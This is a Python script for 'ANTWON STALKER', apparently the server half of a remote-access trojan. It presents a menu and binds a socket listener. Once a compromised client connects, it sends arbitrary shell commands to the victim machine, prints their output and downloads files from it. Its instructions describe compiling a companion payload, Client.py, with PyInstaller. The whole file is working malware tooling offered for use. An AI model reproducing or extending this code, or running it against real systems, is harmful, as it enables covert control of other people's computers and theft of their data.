import socket
import time
import os
global modules
modules = ["download"]

def menu():
    time.sleep(1)
    print('''
    ----------------------------------
    /                                /
   /           ANTWON STALKER       /
  /     BY: PROJECTWD              /
 ----------------------------------
 Menu:
1) Start Server
2) Instructions
3) About
4) License
5) Exit()
 
 ''')
    
    choice = str(input("Choice:  "))
    if choice == "1":
        startServer()
    elif choice == "2":
        instruct()
    elif choice == "3":
        about()
    elif choice == "4":
        License()
    elif choice == "5":
        exit()
    else:
        print("Invalid Choice...")
        menu()
    menu()
def instruct():
    print("""
- The payload is named Client.py.
- The edit the lhost and lport in config.py.
- Compile payload with PyInstaller
- Run listener
- Do stuff
""")
def about():
    print("""
This project was originally made by Spl01ter from ProjectWD.
As this is just the beta, it is missing a lot of features. If you think you can
contribute, please fork. Thank You.
""")
def License():
    print("GNU v3")
def startServer():
    global cmdStarter
    global s
    global c
    s = socket.socket()

    host = socket.gethostname()
    port = 12345
    s.bind((host,port))
    s.listen(0)

    c,addr = s.accept()

    print('Got connection from',addr)
    
    remoteUser = c.recv(2).decode('UTF-8')
    global cmdStarter
    cmdStarter = (str(remoteUser) + "@" + str(addr) + ">")
    sendCommands()
def sendCommands():
    command = str(input(cmdStarter))
    while command != "exit":
        verifyCommand(command)
        command = str(input(cmdStarter))
    c.sendall("exit".encode('utf-8'))
    s.close()
    c.close()
def listenOutput():
    commandOutput = str(c.recv(1024).decode('utf-8'))
    print(commandOutput)
def verifyCommand(command):
    if "cd" not in command and command not in modules:
        c.sendall(command.encode('utf-8'))
        time.sleep(1)
        listenOutput()
    elif command == "download":
        path = str(input("What is the path for the file would you like to download?"))
        c.sendall("download".encode("utf-8"))
        time.sleep(1)
        c.sendall(path.encode("utf-8"))
        time.sleep(1)
        file = c.recv(102400)
        print(file.decode('utf-8'))
    else:
        print("This command has been disabled due to bugs in this code")
menu()
